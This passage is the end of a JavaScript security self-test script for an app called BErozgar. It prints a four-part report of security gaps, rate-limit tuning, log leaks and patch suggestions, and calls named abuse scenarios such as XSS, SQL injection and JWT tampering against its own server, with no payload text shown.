  console.log(`${CYAN}║${BOLD}  SECURITY VALIDATION REPORT${' '.repeat(W - 30)}${RESET}${CYAN}║${RESET}`);
  console.log(`${CYAN}${'╚' + '═'.repeat(W - 2) + '╝'}${RESET}`);
  console.log(`  Target : ${BASE_URL}`);
  console.log(`  Mode   : ${serverWasOnline ? GREEN + 'LIVE — server was online' : YELLOW + 'STATIC — server offline, code-analysis only'}${RESET}`);
  console.log(`  Date   : ${now}`);

  // ── Section 1: Security Gaps ─────────────────────────────────────────────
  console.log(`\n${BOLD}── 1. SECURITY GAPS ────────────────────────────────────${RESET}`);
  if (GAPS.length === 0) {
    console.log(`  ${GREEN}No critical security gaps detected by static analysis.${RESET}`);
  } else {
    for (const g of GAPS) {
      const sev = g.severity === 'CRITICAL' ? RED : g.severity === 'HIGH' ? YELLOW : CYAN;
      console.log(`\n  ${sev}[${g.severity}] ${g.id}: ${g.title}${RESET}`);
      console.log(`  ${DIM}${g.detail}${RESET}`);
    }
  }

  // Live-test failures add to gaps too
  const liveFailures = RESULTS.filter(r => r.result.includes('FAIL'));
  if (liveFailures.length > 0) {
    console.log(`\n  ${RED}[LIVE TEST FAILURES]${RESET}`);
    for (const f of liveFailures) {
      console.log(`  ${RED}✘${RESET} ${f.name}`);
      if (f.note) console.log(`    ${DIM}${f.note}${RESET}`);
    }
  }

  // ── Section 2: Rate Limit Tuning ─────────────────────────────────────────
  console.log(`\n${BOLD}── 2. RATE LIMIT TUNING SUGGESTIONS ───────────────────${RESET}`);
  if (RL_TUNING.length === 0) {
    console.log(`  ${GREEN}Rate limit configuration looks well-tuned.${RESET}`);
  } else {
    for (const rl of RL_TUNING) {
      console.log(`\n  ${CYAN}Route: ${rl.route}${RESET}`);
      console.log(`  Current  : ${rl.current}`);
      console.log(`  Suggested: ${YELLOW}${rl.suggested}${RESET}`);
      console.log(`  Reason   : ${DIM}${rl.reason}${RESET}`);
    }
  }

  // ── Section 3: Log / Leak Issues ─────────────────────────────────────────
  console.log(`\n${BOLD}── 3. LOG / LEAK ISSUES ────────────────────────────────${RESET}`);
  if (LOG_LEAKS.length === 0) {
    console.log(`  ${GREEN}No sensitive data logging detected in audited files.${RESET}`);
  } else {
    for (const ll of LOG_LEAKS) {
      console.log(`\n  ${RED}[LEAK] ${ll.file}:${ll.line}${RESET}`);
      console.log(`  What   : ${ll.description}`);
      console.log(`  Impact : ${RED}${ll.impact}${RESET}`);
    }
  }

  // Also report live stack trace / internal leaks from assertions
  const stackLeaks = RESULTS.filter(r => r.note && (r.note.includes('REFLECTED') || r.note.includes('DB ERROR') || r.note.includes('stack')));
  for (const sl of stackLeaks) {
    console.log(`\n  ${RED}[LIVE LEAK] ${sl.name}${RESET}`);
    console.log(`  ${sl.note}`);
  }

  // ── Section 4: Patch Suggestions ─────────────────────────────────────────
  console.log(`\n${BOLD}── 4. PATCH SUGGESTIONS ────────────────────────────────${RESET}`);
  if (PATCHES.length === 0) {
    console.log(`  ${GREEN}No patches required based on static analysis.${RESET}`);
  } else {
    for (const p of PATCHES) {
      const sev = p.severity === 'CRITICAL' ? RED : p.severity === 'HIGH' ? YELLOW : DIM;
      console.log(`\n  ${sev}[${p.severity}]${RESET} ${p.file}:${p.line}`);
      console.log(`  Fix: ${p.fix}`);
    }
  }

  // ── Final score ───────────────────────────────────────────────────────────
  const totalGaps = GAPS.length + liveFailures.length;
  const critCount = GAPS.filter(g => g.severity === 'CRITICAL').length;
  const highCount = GAPS.filter(g => g.severity === 'HIGH').length;

  console.log(`\n${CYAN}${'─'.repeat(W)}${RESET}`);
  console.log(`  ${BOLD}Score: ${totalGaps === 0 ? GREEN + 'CLEAN' : critCount > 0 ? RED + 'CRITICAL ISSUES FOUND' : YELLOW + 'WARNINGS FOUND'}${RESET}`);
  console.log(`  Critical gaps : ${critCount}`);
  console.log(`  High gaps     : ${highCount}`);
  console.log(`  Log leaks     : ${LOG_LEAKS.length}`);
  console.log(`  Patch items   : ${PATCHES.length}`);
  if (serverWasOnline) {
    console.log(`  Live tests    : ${PASS} pass / ${FAIL} fail / ${WARN} warn`);
  }
  console.log(`${CYAN}${'═'.repeat(W)}${RESET}\n`);
}

/* ═════════════════════════════════════════════════════════════
   Main — run all scenarios sequentially (intentional isolation)
   ═════════════════════════════════════════════════════════════ */
async function main() {
  console.log(`${BOLD}${CYAN}`);
  console.log('  ╔══════════════════════════════════════════════════════╗');
  console.log('  ║   BErozgar — Security Abuse Simulation              ║');
  console.log('  ║   Target: ' + BASE_URL.padEnd(43) + '║');
  console.log('  ╚══════════════════════════════════════════════════════╝');
  console.log(`${RESET}`);

  // Health check first
  const health = await req('GET', '/health');
  const serverOnline = !!health.status;

  if (!serverOnline) {
    console.log(`${YELLOW}⚠ Server unreachable at ${BASE_URL}${RESET}`);
    console.log(`  Error: ${health.error}`);
    console.log(`  ${DIM}Running static code analysis only (no live HTTP tests).${RESET}`);
    console.log(`  ${DIM}To run live tests: cd server && npm run dev${RESET}\n`);
  } else {
    console.log(`${GREEN}✔ Server reachable — status ${health.status}${RESET}`);

    await scenario1_RapidLogin();
    await scenario2_RapidListings();
    await scenario3_RapidRequests();
    await scenario4_IdempotencyReplay();
    await scenario5_CsrfMissing();
    await scenario6_XSSPayload();
    await scenario7_SQLInjection();
    await scenario8_JWTTampering();
    await scenario9_RoleEscalation();
    await scenario10_AdminAccess();

    printSummary();
  }

  // Static analysis always runs
  runStaticAnalysis();

  // 4-part report always runs
  print4PartReport(serverOnline);

  process.exit(FAIL > 0 ? 1 : 0);
}

main();
